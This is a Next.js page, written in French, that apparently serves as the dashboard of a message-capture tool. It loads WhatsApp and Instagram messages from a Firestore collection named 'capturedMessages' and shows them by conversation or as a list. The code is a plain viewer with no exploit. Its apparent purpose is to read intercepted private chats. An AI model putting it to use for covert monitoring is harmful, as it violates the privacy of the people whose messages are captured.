'use client';

import { useState, useEffect, useMemo } from 'react';
import { collection, query, orderBy, onSnapshot, where } from 'firebase/firestore';
import { db } from '../../../lib/firebase-client';

interface Message {
  id: string;
  appName?: string;
  sender?: string;
  recipient?: string;
  text?: string;
  timestamp?: any;
  messageType?: string;
  isSent?: boolean;
}

interface Conversation {
  contact: string;
  app: string;
  messages: Message[];
  lastMessage: Date;
  totalSent: number;
  totalReceived: number;
}

export default function MessagesPage() {
  const [messages, setMessages] = useState<Message[]>([]);
  const [loading, setLoading] = useState(true);
  const [loadedCount, setLoadedCount] = useState(0);
  const [filter, setFilter] = useState('all');
  const [search, setSearch] = useState('');
  const [viewMode, setViewMode] = useState<'list' | 'conversations'>('conversations');
  const [selectedConversation, setSelectedConversation] = useState<string | null>(null);
  const [displayLimit, setDisplayLimit] = useState(100); // Start with 100 messages

  useEffect(() => {
    setLoading(true);
    setLoadedCount(0);
    setDisplayLimit(100); // Reset display limit when filter changes

    // Build query - NO LIMIT to load ALL messages
    let q = query(
      collection(db, 'capturedMessages'),
      orderBy('timestamp', 'desc')
    );

    // Add filter for app type
    if (filter !== 'all') {
      q = query(
        collection(db, 'capturedMessages'),
        where('appName', '==', filter === 'whatsapp' ? 'WhatsApp' : 'Instagram'),
        orderBy('timestamp', 'desc')
      );
    }

    const unsubscribe = onSnapshot(q, (snapshot) => {
      const messagesData = snapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data()
      })) as Message[];

      setMessages(messagesData);
      setLoadedCount(messagesData.length);
      setLoading(false);
    }, (error) => {
      console.error('Error loading messages:', error);
      setLoading(false);
    });

    return () => unsubscribe();
  }, [filter]);

  // Group messages by conversation
  const conversations = useMemo(() => {
    const convMap = new Map<string, Conversation>();

    messages.forEach((msg: Message) => {
      const isSent = msg.isSent || msg.messageType === 'sent';
      const contact = isSent ? (msg.recipient || 'Unknown') : (msg.sender || 'Unknown');

      if (contact === 'Me' || contact === 'Unknown') return;

      const app = msg.appName || 'Unknown';
      const key = `${contact}-${app}`;

      if (!convMap.has(key)) {
        convMap.set(key, {
          contact,
          app,
          messages: [],
          lastMessage: msg.timestamp?.toDate?.() || new Date(),
          totalSent: 0,
          totalReceived: 0
        });
      }

      const conv = convMap.get(key)!;
      conv.messages.push(msg);

      if (msg.timestamp) {
        const msgDate = msg.timestamp.toDate ? msg.timestamp.toDate() : new Date(msg.timestamp);
        if (msgDate > conv.lastMessage) {
          conv.lastMessage = msgDate;
        }
      }

      if (isSent) {
        conv.totalSent++;
      } else {
        conv.totalReceived++;
      }
    });

    // Sort conversations by last message
    return Array.from(convMap.entries())
      .map(([key, conv]) => ({
        key,
        ...conv,
        messages: conv.messages.sort((a, b) => {
          const timeA = a.timestamp?.toDate?.()?.getTime() || 0;
          const timeB = b.timestamp?.toDate?.()?.getTime() || 0;
          return timeA - timeB;
        })
      }))
      .sort((a, b) => b.lastMessage.getTime() - a.lastMessage.getTime());
  }, [messages]);

  // Filter messages by search and apply display limit
  const filteredMessages = useMemo(() => {
    const filtered = messages.filter(msg => {
      if (!search) return true;
      const searchLower = search.toLowerCase();
      return (
        msg.text?.toLowerCase().includes(searchLower) ||
        msg.sender?.toLowerCase().includes(searchLower) ||
        msg.recipient?.toLowerCase().includes(searchLower)
      );
    });

    // Apply display limit for performance
    return filtered.slice(0, displayLimit);
  }, [messages, search, displayLimit]);

  // Filter conversations by search
  const filteredConversations = conversations.filter(conv => {
    if (!search) return true;
    const searchLower = search.toLowerCase();
    return (
      conv.contact.toLowerCase().includes(searchLower) ||
      conv.messages.some(m => m.text?.toLowerCase().includes(searchLower))
    );
  });

  const selectedConv = conversations.find(c => c.key === selectedConversation);

  const formatTime = (timestamp: any) => {
    if (!timestamp) return 'N/A';
    try {
      const date = timestamp.toDate ? timestamp.toDate() : new Date(timestamp);
      return date.toLocaleString('fr-FR', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
      });
    } catch {
      return 'N/A';
    }
  };

  const formatTimeShort = (date: Date) => {
    try {
      const now = new Date();
      const diffMs = now.getTime() - date.getTime();
      const diffMins = Math.floor(diffMs / 60000);
      const diffHours = Math.floor(diffMins / 60);
      const diffDays = Math.floor(diffHours / 24);

      if (diffMins < 1) return 'À l\'instant';
      if (diffMins < 60) return `Il y a ${diffMins}min`;
      if (diffHours < 24) return `Il y a ${diffHours}h`;
      if (diffDays < 7) return `Il y a ${diffDays}j`;
      return date.toLocaleDateString('fr-FR');
    } catch {
      return '';
    }
  };

  return (
    <div className="p-6 space-y-6">
      {/* Header with Loading Indicator */}
      <div className="flex items-center justify-between">
        <div>
          <div className="flex items-center gap-4">
            <h1 className="text-3xl font-bold text-white">Messages</h1>
            {loading && (
              <div className="flex items-center gap-2 bg-blue-500/20 px-4 py-2 rounded-full animate-pulse">
                <span className="text-blue-400 text-xl">⏳</span>
                <span className="text-blue-400 font-semibold">
                  Chargement... {loadedCount > 0 && `${loadedCount} chargés`}
                </span>
              </div>
            )}
            {!loading && loadedCount > 0 && (
              <div className="flex items-center gap-2 bg-green-500/20 px-4 py-2 rounded-full">
                <span className="text-green-400 text-xl">✓</span>
                <span className="text-green-400 font-semibold">
                  {loadedCount} messages chargés
                </span>
              </div>
            )}
          </div>
          <p className="text-gray-400 mt-2">
            {viewMode === 'conversations'
              ? `${filteredConversations.length} conversations`
              : `${filteredMessages.length} affichés sur ${messages.length} messages au total`}
          </p>
        </div>
        <div className="flex gap-3">
          {viewMode === 'list' && messages.length > displayLimit && (
            <button
              onClick={() => setDisplayLimit(messages.length)}
              className="bg-green-500 hover:bg-green-600 px-4 py-3 rounded-lg text-white font-semibold transition-all"
              title="Afficher tous les messages"
            >
              📄 Tout afficher ({messages.length})
            </button>
          )}
          <button
            onClick={() => setViewMode(viewMode === 'list' ? 'conversations' : 'list')}
            className="bg-blue-500 hover:bg-blue-600 px-6 py-3 rounded-lg text-white font-semibold transition-all"
          >
            {viewMode === 'list' ? '💬 Vue Conversations' : '📋 Vue Liste'}
          </button>
          <button
            onClick={() => window.location.reload()}
            className="bg-white/10 hover:bg-white/20 px-4 py-3 rounded-lg text-white transition-all"
            title="Actualiser"
          >
            🔄
          </button>
        </div>
      </div>

      {/* Loading Progress Bar */}
      {loading && loadedCount > 0 && (
        <div className="glass-card p-4">
          <div className="flex items-center justify-between mb-2">
            <span className="text-sm text-gray-400">Chargement des messages...</span>
            <span className="text-sm font-semibold text-blue-400">{loadedCount} chargés</span>
          </div>
          <div className="w-full bg-white/10 rounded-full h-2 overflow-hidden">
            <div
              className="bg-blue-500 h-full rounded-full transition-all duration-300 animate-pulse"
              style={{ width: '100%' }}
            />
          </div>
        </div>
      )}

      {/* Filters */}
      <div className="glass-card p-4 space-y-4">
        {/* Search */}
        <input
          type="text"
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          placeholder="Rechercher..."
          className="w-full px-4 py-2 bg-white/5 border border-white/10 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:border-blue-500"
        />

        {/* App Filter */}
        <div className="flex gap-2">
          {['all', 'whatsapp', 'instagram'].map((f) => (
            <button
              key={f}
              onClick={() => setFilter(f)}
              className={`px-4 py-2 rounded-lg font-medium transition-all ${
                filter === f
                  ? 'bg-blue-500 text-white'
                  : 'bg-white/5 text-gray-400 hover:bg-white/10'
              }`}
            >
              {f === 'all' && '🌐 Tous'}
              {f === 'whatsapp' && '📱 WhatsApp'}
              {f === 'instagram' && '📷 Instagram'}
            </button>
          ))}
        </div>
      </div>

      {/* Content */}
      {loading && loadedCount === 0 ? (
        <div className="glass-card p-12 text-center">
          <div className="text-6xl mb-4 animate-pulse">⏳</div>
          <p className="text-blue-400 text-lg">Chargement des messages...</p>
          <p className="text-gray-500 text-sm mt-2">Connexion à Firestore...</p>
        </div>
      ) : viewMode === 'conversations' ? (
        /* Conversations View */
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Conversations List */}
          <div className="lg:col-span-1 glass-card p-4">
            <h3 className="text-lg font-bold text-white mb-4">
              Conversations ({filteredConversations.length})
            </h3>
            <div className="space-y-2 max-h-[600px] overflow-y-auto">
              {filteredConversations.length === 0 ? (
                <div className="text-center py-8">
                  <p className="text-gray-400">Aucune conversation</p>
                </div>
              ) : (
                filteredConversations.map((conv) => (
                  <button
                    key={conv.key}
                    onClick={() => setSelectedConversation(conv.key)}
                    className={`w-full text-left p-4 rounded-lg transition-all ${
                      selectedConversation === conv.key
                        ? 'bg-blue-500/20 border-2 border-blue-500'
                        : 'bg-white/5 hover:bg-white/10 border-2 border-transparent'
                    }`}
                  >
                    <div className="flex items-start space-x-3">
                      <div className={`w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0 ${
                        conv.app.toLowerCase().includes('whatsapp')
                          ? 'bg-green-500/20 text-green-400'
                          : 'bg-pink-500/20 text-pink-400'
                      }`}>
                        {conv.app.toLowerCase().includes('whatsapp') ? '📱' : '📷'}
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center justify-between mb-1">
                          <h4 className="text-white font-semibold truncate">{conv.contact}</h4>
                        </div>
                        <p className="text-gray-400 text-xs truncate">
                          {conv.messages[conv.messages.length - 1]?.text || '(No content)'}
                        </p>
                        <div className="flex items-center justify-between mt-2">
                          <span className="text-xs text-gray-500">
                            {formatTimeShort(conv.lastMessage)}
                          </span>
                          <div className="flex items-center space-x-2 text-xs">
                            <span className="text-green-400">📤 {conv.totalSent}</span>
                            <span className="text-blue-400">📥 {conv.totalReceived}</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </button>
                ))
              )}
            </div>
          </div>

          {/* Conversation Detail */}
          <div className="lg:col-span-2 glass-card p-6">
            {selectedConv ? (
              <>
                <div className="flex items-center justify-between mb-6 pb-4 border-b border-white/10">
                  <div className="flex items-center space-x-4">
                    <div className={`w-12 h-12 rounded-full flex items-center justify-center ${
                      selectedConv.app.toLowerCase().includes('whatsapp')
                        ? 'bg-green-500/20 text-green-400'
                        : 'bg-pink-500/20 text-pink-400'
                    }`}>
                      {selectedConv.app.toLowerCase().includes('whatsapp') ? '📱' : '📷'}
                    </div>
                    <div>
                      <h3 className="text-xl font-bold text-white">{selectedConv.contact}</h3>
                      <p className="text-sm text-gray-400">{selectedConv.app} • {selectedConv.messages.length} messages</p>
                    </div>
                  </div>
                  <button
                    onClick={() => setSelectedConversation(null)}
                    className="text-gray-400 hover:text-white transition-colors text-2xl"
                  >
                    ✕
                  </button>
                </div>

                <div className="space-y-4 max-h-[500px] overflow-y-auto">
                  {selectedConv.messages.map((msg) => {
                    const isSent = msg.isSent || msg.messageType === 'sent';

                    return (
                      <div key={msg.id} className={`flex ${isSent ? 'justify-end' : 'justify-start'}`}>
                        <div className={`max-w-[70%] rounded-lg p-3 ${
                          isSent
                            ? 'bg-green-500/20 border border-green-500/30'
                            : 'bg-blue-500/20 border border-blue-500/30'
                        }`}>
                          <div className="flex items-center gap-2 mb-1">
                            <span className="text-xs font-semibold">
                              {isSent ? '📤 Envoyé' : '📥 Reçu'}
                            </span>
                          </div>
                          <p className="text-white break-words">{msg.text || '(No content)'}</p>
                          <p className="text-xs text-gray-400 mt-1">{formatTime(msg.timestamp)}</p>
                        </div>
                      </div>
                    );
                  })}
                </div>
              </>
            ) : (
              <div className="flex items-center justify-center h-full text-center py-20">
                <div>
                  <div className="text-6xl mb-4">💬</div>
                  <p className="text-gray-400 text-lg">Sélectionnez une conversation</p>
                  <p className="text-gray-500 text-sm mt-2">Cliquez sur une conversation pour voir les détails</p>
                </div>
              </div>
            )}
          </div>
        </div>
      ) : (
        /* List View */
        filteredMessages.length === 0 ? (
          <div className="glass-card p-12 text-center">
            <div className="text-6xl mb-4">📭</div>
            <p className="text-gray-400 text-lg">Aucun message trouvé</p>
            <p className="text-gray-500 text-sm mt-2">
              {search ? 'Essayez une autre recherche' : 'Les messages apparaîtront ici'}
            </p>
          </div>
        ) : (
          <div className="glass-card overflow-hidden">
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="border-b border-white/10">
                    <th className="px-6 py-4 text-left text-xs font-semibold text-gray-400 uppercase">App</th>
                    <th className="px-6 py-4 text-left text-xs font-semibold text-gray-400 uppercase">Type</th>
                    <th className="px-6 py-4 text-left text-xs font-semibold text-gray-400 uppercase">Contact</th>
                    <th className="px-6 py-4 text-left text-xs font-semibold text-gray-400 uppercase">Message</th>
                    <th className="px-6 py-4 text-left text-xs font-semibold text-gray-400 uppercase">Date</th>
                  </tr>
                </thead>
                <tbody>
                  {filteredMessages.map((msg) => {
                    const isSent = msg.isSent || msg.messageType === 'sent';
                    const contact = isSent ? msg.recipient : msg.sender;

                    return (
                      <tr key={msg.id} className="border-b border-white/5 hover:bg-white/5 transition-colors">
                        <td className="px-6 py-4 whitespace-nowrap">
                          <div className="flex items-center gap-2">
                            <span className="text-2xl">
                              {msg.appName?.toLowerCase().includes('whatsapp') ? '📱' : '📷'}
                            </span>
                            <span className="text-sm text-gray-300">
                              {msg.appName || 'N/A'}
                            </span>
                          </div>
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap">
                          <span className={`inline-flex px-3 py-1 rounded-full text-xs font-semibold ${
                            isSent
                              ? 'bg-green-500/20 text-green-400'
                              : 'bg-blue-500/20 text-blue-400'
                          }`}>
                            {isSent ? '📤 Envoyé' : '📥 Reçu'}
                          </span>
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap">
                          <span className="text-white font-medium">
                            {contact || 'Unknown'}
                          </span>
                        </td>
                        <td className="px-6 py-4">
                          <p className="text-gray-300 line-clamp-2 max-w-md">
                            {msg.text || '(No content)'}
                          </p>
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-400">
                          {formatTime(msg.timestamp)}
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>

            <div className="px-6 py-4 border-t border-white/10 bg-white/5">
              <div className="flex items-center justify-between">
                <p className="text-sm text-gray-400">
                  Affichage de {filteredMessages.length} sur {messages.length} messages
                </p>
                {filteredMessages.length < messages.length && (
                  <button
                    onClick={() => setDisplayLimit(prev => prev + 100)}
                    className="bg-blue-500 hover:bg-blue-600 px-4 py-2 rounded-lg text-white font-semibold transition-all text-sm"
                  >
                    ⬇ Charger 100 de plus
                  </button>
                )}
                {filteredMessages.length >= messages.length && messages.length > 100 && (
                  <button
                    onClick={() => setDisplayLimit(100)}
                    className="bg-white/10 hover:bg-white/20 px-4 py-2 rounded-lg text-white font-semibold transition-all text-sm"
                  >
                    ⬆ Afficher moins
                  </button>
                )}
              </div>
            </div>
          </div>
        )
      )}
    </div>
  );
}
